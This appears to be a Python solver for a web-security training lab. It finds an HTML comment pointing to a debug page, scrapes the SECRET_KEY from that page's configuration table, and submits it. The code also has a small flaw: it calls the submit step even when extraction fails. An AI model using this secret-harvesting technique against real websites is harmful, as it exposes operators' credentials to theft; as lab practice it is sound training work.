from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup, Comment
from urllib.parse import urljoin
import re


def solve_lab(session):
    # Extracting comment
    logger.info(f'Visiting "{session.url}"...')
    resp = session.get_path("/")
    soup = BeautifulSoup(resp.text, "lxml")
    comment = soup.find(string=lambda text: isinstance(text, Comment))
    if comment is None:
        logger.failure("Unable to find comment with link to debug page.")
        return
    else:
        logger.success(f'Found comment: "{comment}"')

    # Extracting "href" value from comment
    soup = BeautifulSoup(comment, "lxml")
    href = soup.select_one("a").get("href")
    logger.info(f'Extracting SECRET_KEY from "{urljoin(session.url, href)}"...')

    # Extracting SECRET_KEY
    resp = session.get_path(href)
    match = re.search(
        r'<tr><td class="e">SECRET_KEY </td><td class="v">(.*)</td></tr>', resp.text
    )
    if match is None:
        logger.failure("Unable to extract SECRET_KEY.")
    else:
        secret_key = match.group(1).strip()
        logger.success(f"SECRET_KEY: {secret_key}")

    session.submit_solution(secret_key)
